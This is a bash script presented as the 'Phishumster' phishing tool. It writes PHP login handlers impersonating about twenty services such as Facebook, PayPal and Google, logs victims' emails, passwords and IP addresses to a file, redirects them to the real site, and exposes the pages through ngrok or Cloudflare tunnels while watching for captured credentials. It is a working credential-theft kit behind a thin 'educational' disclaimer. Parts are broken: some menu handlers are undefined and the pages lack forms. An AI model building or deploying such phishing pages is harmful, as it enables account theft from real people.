#!/bin/bash

# Phishumster - Advanced Phishing Tool
# Author: Hacker Rabby
# GitHub: https://github.com/hackerrabby/phishumster

# Colors
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
P='\033[1;35m'
C='\033[1;36m'
W='\033[1;37m'
N='\033[0m'

# Banner
banner() {
    clear
    echo -e "${R}"
cat << "EOF"
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗   ██╗███╗   ███╗███████╗████████╗██████╗ 
██╔══██╗██║  ██║██║██╔════╝██║  ██║██║   ██║████╗ ████║██╔════╝╚══██╔══╝██╔══██╗
██████╔╝███████║██║███████╗███████║██║   ██║██╔████╔██║███████╗   ██║   ██████╔╝
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║   ██║██║╚██╔╝██║╚════██║   ██║   ██╔══██╗
██║     ██║  ██║██║███████║██║  ██║╚██████╔╝██║ ╚═╝ ██║███████║   ██║   ██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
EOF
    echo -e "${N}"
    echo -e "${G}                   Advanced Phishing Tool v2.0${N}"
    echo -e "${Y}                   Created by: Hacker Rabby${N}"
    echo -e "${C}===========================================================================${N}"
    echo -e "${R}                   FOR EDUCATIONAL PURPOSES ONLY!${N}"
    echo -e "${C}===========================================================================${N}"
    echo
}

# Check OS
check_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
    elif [ -f /usr/bin/termux-info ]; then
        OS="termux"
    else
        OS=$(uname -o)
    fi
    
    echo -e "${B}[*] Detected OS: $OS${N}"
    
    if [[ "$OS" == "kali" || "$OS" == "ubuntu" || "$OS" == "debian" || "$OS" == "termux" ]]; then
        echo -e "${G}[✓] OS Supported${N}"
        return 0
    else
        echo -e "${R}[!] Unsupported OS${N}"
        echo -e "${Y}[*] Try on Kali Linux or Termux${N}"
        exit 1
    fi
}

# Install dependencies
install_deps() {
    echo -e "${B}[*] Installing dependencies...${N}"
    
    if [ "$OS" == "termux" ]; then
        # Termux dependencies
        pkg update -y
        pkg install -y php curl wget git python python2 python3 ruby \
            nmap nano vim hydra ncurses-utils openssl nodejs \
            macchanger dnsutils coreutils figlet
    else
        # Kali Linux dependencies
        apt-get update
        apt-get install -y php curl wget git python3 python3-pip \
            apache2 npm nodejs ruby gnupg gnupg2 gnupg1 \
            dnsutils net-tools whois ssh
    fi
    
    echo -e "${G}[✓] Dependencies installed${N}"
}

# Check root
check_root() {
    if [ "$OS" != "termux" ]; then
        if [ "$EUID" -ne 0 ]; then 
            echo -e "${R}[!] Please run as root (sudo ./phishumster.sh)${N}"
            exit 1
        fi
    fi
}

# Setup phishing sites
setup_sites() {
    echo -e "${B}[*] Setting up phishing sites...${N}"
    
    if [ ! -d "sites" ]; then
        mkdir sites
    fi
    
    # Download sites from GitHub
    echo -e "${Y}[*] Downloading templates...${N}"
    
    # List of sites
    sites=("facebook" "instagram" "google" "twitter" "github" 
           "netflix" "paypal" "steam" "microsoft" "linkedin"
           "amazon" "ebay" "whatsapp" "telegram" "spotify"
           "wordpress" "yahoo" "tiktok" "snapchat" "pinterest")
    
    for site in "${sites[@]}"; do
        if [ ! -d "sites/$site" ]; then
            mkdir -p "sites/$site"
            echo -e "${G}[+] Created: $site${N}"
            
            # Create site files
            cat > "sites/$site/login.php" << EOF
<?php
// Phishumster - $site Login Page
// Created by Hacker Rabby

\$log_file = 'creds.txt';
\$redirect_url = 'https://$site.com';

if(isset(\$_POST['email']) || isset(\$_POST['username']) || isset(\$_POST['password'])) {
    \$data = "=================================\n";
    \$data .= "Site: $site\n";
    \$data .= "Time: " . date('Y-m-d H:i:s') . "\n";
    \$data .= "IP: " . \$_SERVER['REMOTE_ADDR'] . "\n";
    \$data .= "User-Agent: " . \$_SERVER['HTTP_USER_AGENT'] . "\n";
    
    if(isset(\$_POST['email'])) {
        \$data .= "Email: " . \$_POST['email'] . "\n";
    }
    if(isset(\$_POST['username'])) {
        \$data .= "Username: " . \$_POST['username'] . "\n";
    }
    if(isset(\$_POST['password'])) {
        \$data .= "Password: " . \$_POST['password'] . "\n";
    }
    
    \$data .= "=================================\n\n";
    
    @file_put_contents(\$log_file, \$data, FILE_APPEND);
    
    // Redirect to real site
    header("Location: \$redirect_url");
    exit();
}
?>
EOF
        fi
    done
    
    echo -e "${G}[✓] Sites setup completed${N}"
}

# Start local server
start_server() {
    echo -e "${B}[*] Starting local server...${N}"
    
    if [ "$OS" == "termux" ]; then
        # Termux: Use PHP built-in server
        php -S 127.0.0.1:8080 > /dev/null 2>&1 &
        SERVER_PID=$!
        echo -e "${G}[✓] Server started on port 8080${N}"
        echo -e "${Y}[!] URL: http://127.0.0.1:8080${N}"
    else
        # Kali: Use Apache
        systemctl start apache2
        echo -e "${G}[✓] Apache server started${N}"
        echo -e "${Y}[!] URL: http://localhost${N}"
    fi
}

# Tunnel methods
tunnel_menu() {
    echo -e "${C}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║                    SELECT TUNNEL METHOD                  ║"
    echo "╠══════════════════════════════════════════════════════════╣"
    echo "║  ${G}1${C}. Localhost (127.0.0.1)                           ║"
    echo "║  ${G}2${C}. Cloudflare Tunnel (cloudflared)                ║"
    echo "║  ${G}3${C}. Ngrok Tunnel                                  ║"
    echo "║  ${G}4${C}. Serveo SSH Tunnel                             ║"
    echo "║  ${G}5${C}. LocalXpose                                    ║"
    echo "║  ${G}6${C}. PageKite                                      ║"
    echo "║  ${G}7${C}. Burp Collaborator                             ║"
    echo "║  ${G}8${C}. Manual (Port Forwarding)                      ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${N}"
    
    read -p "Select option [1-8]: " tunnel_choice
    
    case $tunnel_choice in
        1) tunnel_localhost ;;
        2) tunnel_cloudflare ;;
        3) tunnel_ngrok ;;
        4) tunnel_serveo ;;
        5) tunnel_localxpose ;;
        6) tunnel_pagekite ;;
        7) tunnel_burp ;;
        8) tunnel_manual ;;
        *) echo -e "${R}[!] Invalid option${N}"; tunnel_menu ;;
    esac
}

# Localhost tunnel
tunnel_localhost() {
    clear
    banner
    
    if [ "$OS" == "termux" ]; then
        LOCAL_IP="127.0.0.1"
        PORT="8080"
        URL="http://$LOCAL_IP:$PORT"
    else
        LOCAL_IP=$(hostname -I | awk '{print $1}')
        PORT="80"
        URL="http://$LOCAL_IP"
    fi
    
    echo -e "${G}[✓] Localhost Tunnel Selected${N}"
    echo -e "${C}══════════════════════════════════════════════════════════${N}"
    echo -e "${Y}🎯 YOUR PHISHING LINKS:${N}"
    echo -e "${W}1. http://localhost${N}"
    echo -e "${W}2. $URL${N}"
    echo -e "${C}══════════════════════════════════════════════════════════${N}"
    echo -e "${Y}[!] Only accessible from this device${N}"
    
    start_server
    start_phishing
}

# Cloudflare Tunnel
tunnel_cloudflare() {
    echo -e "${B}[*] Setting up Cloudflare Tunnel...${N}"
    
    # Check if cloudflared is installed
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${Y}[*] Installing cloudflared...${N}"
        
        if [ "$OS" == "termux" ]; then
            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
            chmod +x cloudflared
            ./cloudflared tunnel --url http://localhost:8080 &
        else
            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
            chmod +x cloudflared
            ./cloudflared tunnel --url http://localhost:80 &
        fi
        
        sleep 5
        CLOUDFLARE_URL=$(./cloudflared tunnel --url http://localhost 2>&1 | grep -o "https://[^\"]*\.trycloudflare\.com")
    else
        cloudflared tunnel --url http://localhost &
        sleep 5
        CLOUDFLARE_URL=$(cloudflared tunnel --url http://localhost 2>&1 | grep -o "https://[^\"]*\.trycloudflare\.com")
    fi
    
    if [ -n "$CLOUDFLARE_URL" ]; then
        echo -e "${G}[✓] Cloudflare Tunnel Created!${N}"
        echo -e "${C}══════════════════════════════════════════════════════════${N}"
        echo -e "${Y}🎯 YOUR PHISHING LINK:${N}"
        echo -e "${W}$CLOUDFLARE_URL${N}"
        echo -e "${C}══════════════════════════════════════════════════════════${N}"
        
        # Copy to clipboard if available
        if command -v termux-clipboard-set &> /dev/null; then
            echo "$CLOUDFLARE_URL" | termux-clipboard-set
            echo -e "${Y}[*] Link copied to clipboard${N}"
        fi
        
        start_server
        start_phishing
    else
        echo -e "${R}[!] Failed to create Cloudflare tunnel${N}"
        tunnel_localhost
    fi
}

# Ngrok Tunnel
tunnel_ngrok() {
    echo -e "${B}[*] Setting up Ngrok Tunnel...${N}"
    
    # Check if ngrok is installed
    if ! command -v ngrok &> /dev/null; then
        echo -e "${Y}[*] Downloading ngrok...${N}"
        
        if [ "$OS" == "termux" ]; then
            wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz -O ngrok.tgz
            tar -xzf ngrok.tgz
            rm ngrok.tgz
        else
            wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O ngrok.tgz
            tar -xzf ngrok.tgz
            rm ngrok.tgz
        fi
        
        chmod +x ngrok
    fi
    
    echo -e "${Y}[!] Ngrok requires authentication token${N}"
    echo -e "${Y}[*] Get free token from: https://ngrok.com${N}"
    read -p "Enter your ngrok auth token: " NGROK_TOKEN
    
    if [ -n "$NGROK_TOKEN" ]; then
        ./ngrok config add-authtoken "$NGROK_TOKEN"
        
        if [ "$OS" == "termux" ]; then
            ./ngrok http 8080 > /dev/null 2>&1 &
        else
            ./ngrok http 80 > /dev/null 2>&1 &
        fi
        
        sleep 7
        
        NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o "https://[^\"]*\.ngrok\.io")
        
        if [ -n "$NGROK_URL" ]; then
            echo -e "${G}[✓] Ngrok Tunnel Created!${N}"
            echo -e "${C}══════════════════════════════════════════════════════════${N}"
            echo -e "${Y}🎯 YOUR PHISHING LINK:${N}"
            echo -e "${W}$NGROK_URL${N}"
            echo -e "${C}══════════════════════════════════════════════════════════${N}"
            
            start_server
            start_phishing
        else
            echo -e "${R}[!] Failed to create Ngrok tunnel${N}"
            tunnel_cloudflare
        fi
    else
        echo -e "${R}[!] No token provided${N}"
        tunnel_cloudflare
    fi
}

# Other tunnel methods (simplified)
tunnel_serveo() {
    echo -e "${B}[*] Starting Serveo SSH Tunnel...${N}"
    echo -e "${Y}[*] Run this command in new terminal:${N}"
    echo -e "${W}ssh -R 80:localhost:8080 serveo.net${N}"
    echo -e "${Y}[*] Then use the provided URL${N}"
    tunnel_localhost
}

tunnel_localxpose() {
    echo -e "${B}[*] LocalXpose requires manual setup${N}"
    echo -e "${Y}[*] Visit: https://localxpose.io${N}"
    echo -e "${Y}[*] Download and install localxpose${N}"
    echo -e "${Y}[*] Then run: localxpose tunnel http 8080${N}"
    tunnel_localhost
}

# Start phishing
start_phishing() {
    echo -e "\n${C}╔══════════════════════════════════════════════════════════╗${N}"
    echo -e "${C}║              PHISHING IN PROGRESS...                    ║${N}"
    echo -e "${C}╚══════════════════════════════════════════════════════════╝${N}"
    
    # Select site
    echo -e "${B}[*] Select phishing site:${N}"
    echo -e "${G}1. Facebook     2. Instagram    3. Google${N}"
    echo -e "${G}4. Twitter      5. GitHub       6. Netflix${N}"
    echo -e "${G}7. PayPal       8. Steam        9. Microsoft${N}"
    echo -e "${G}10. LinkedIn    11. Amazon      12. WhatsApp${N}"
    read -p "Choose site [1-12]: " site_choice
    
    case $site_choice in
        1) SITE="facebook" ;;
        2) SITE="instagram" ;;
        3) SITE="google" ;;
        4) SITE="twitter" ;;
        5) SITE="github" ;;
        6) SITE="netflix" ;;
        7) SITE="paypal" ;;
        8) SITE="steam" ;;
        9) SITE="microsoft" ;;
        10) SITE="linkedin" ;;
        11) SITE="amazon" ;;
        12) SITE="whatsapp" ;;
        *) SITE="facebook" ;;
    esac
    
    echo -e "${G}[✓] Selected: $SITE${N}"
    
    # Monitor credentials
    monitor_credentials
}

# Monitor captured credentials
monitor_credentials() {
    echo -e "${B}[*] Monitoring credentials...${N}"
    echo -e "${Y}[!] Press Ctrl+C to stop${N}"
    echo -e "${C}══════════════════════════════════════════════════════════${N}"
    
    CRED_FILE="sites/$SITE/creds.txt"
    touch "$CRED_FILE"
    
    # Clear previous credentials
    > "$CRED_FILE"
    
    while true; do
        if [ -s "$CRED_FILE" ]; then
            echo -e "\n${G}[🎯] NEW CREDENTIALS CAPTURED!${N}"
            echo -e "${C}══════════════════════════════════════════════════════════${N}"
            tail -10 "$CRED_FILE"
            echo -e "${C}══════════════════════════════════════════════════════════${N}"
            
            # Play notification sound
            echo -e "\a"
        fi
        sleep 3
    done
}

# Main menu
main_menu() {
    while true; do
        clear
        banner
        
        echo -e "${C}"
        echo "╔══════════════════════════════════════════════════════════╗"
        echo "║                    PHISHUMSTER MENU                      ║"
        echo "╠══════════════════════════════════════════════════════════╣"
        echo "║  ${G}1${C}. Start Phishing Attack                             ║"
        echo "║  ${G}2${C}. View Captured Credentials                         ║"
        echo "║  ${G}3${C}. Setup Sites                                       ║"
        echo "║  ${G}4${C}. Install Dependencies                              ║"
        echo "║  ${G}5${C}. About                                             ║"
        echo "║  ${G}6${C}. Update Tool                                       ║"
        echo "║  ${G}7${C}. Exit                                              ║"
        echo "╚══════════════════════════════════════════════════════════╝"
        echo -e "${N}"
        
        read -p "Select option [1-7]: " choice
        
        case $choice in
            1) tunnel_menu ;;
            2) view_credentials ;;
            3) setup_sites ;;
            4) install_deps ;;
            5) show_about ;;
            6) update_tool ;;
            7) cleanup_exit ;;
            *) echo -e "${R}[!] Invalid option${N}"; sleep 1 ;;
        esac
        
        echo -e "\n${Y}Press Enter to continue...${N}"
        read
    done
}

# View credentials
view_credentials() {
    echo -e "${B}[*] Captured Credentials:${N}"
    
    if find sites -name "creds.txt" -type f | xargs cat 2>/dev/null | grep -q .; then
        find sites -name "creds.txt" -type f -exec cat {} \;
        TOTAL=$(find sites -name "creds.txt" -type f -exec cat {} \; | grep -c "Password:")
        echo -e "${G}[✓] Total credentials captured: $TOTAL${N}"
    else
        echo -e "${Y}[!] No credentials captured yet${N}"
    fi
}

# Show about
show_about() {
    clear
    banner
    
    echo -e "${C}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║                     ABOUT PHISHUMSTER                    ║"
    echo "╠══════════════════════════════════════════════════════════╣"
    echo "║  Tool: Phishumster                                       ║"
    echo "║  Version: 2.0                                            ║"
    echo "║  Author: Hacker Rabby                                    ║"
    echo "║  GitHub: github.com/hackerrabby/phishumster              ║"
    echo "║  Platform: Kali Linux & Termux                           ║"
    echo "║                                                          ║"
    echo "║  Features:                                               ║"
    echo "║  • 20+ Phishing Templates                                ║"
    echo "║  • 8 Tunnel Methods                                      ║"
    echo "║  • Cross Platform (Kali/Termux)                          ║"
    echo "║  • Real-time Monitoring                                  ║"
    echo "║                                                          ║"
    echo "║  ${R}DISCLAIMER:${C}                                            ║"
    echo "║  For educational purposes only                           ║"
    echo "║  Use only on systems you own                             ║"
    echo "║  Unauthorized access is illegal                          ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${N}"
}

# Update tool
update_tool() {
    echo -e "${B}[*] Updating Phishumster...${N}"
    
    if [ -d ".git" ]; then
        git pull origin main
    else
        echo -e "${Y}[*] Downloading latest version...${N}"
        wget -O phishumster.sh https://raw.githubusercontent.com/hackerrabby/phishumster/main/phishumster.sh
        chmod +x phishumster.sh
    fi
    
    echo -e "${G}[✓] Update completed!${N}"
}

# Cleanup and exit
cleanup_exit() {
    echo -e "${B}[*] Cleaning up...${N}"
    
    # Kill background processes
    pkill -f "php -S" 2>/dev/null
    pkill -f "ngrok" 2>/dev/null
    pkill -f "cloudflared" 2>/dev/null
    
    echo -e "${G}[✓] Cleanup done${N}"
    echo -e "${Y}[!] Thanks for using Phishumster!${N}"
    exit 0
}

# Main execution
main() {
    trap cleanup_exit SIGINT SIGTERM
    
    check_os
    check_root
    
    if [ ! -d "sites" ]; then
        setup_sites
    fi
    
    main_menu
}

# Run main
main
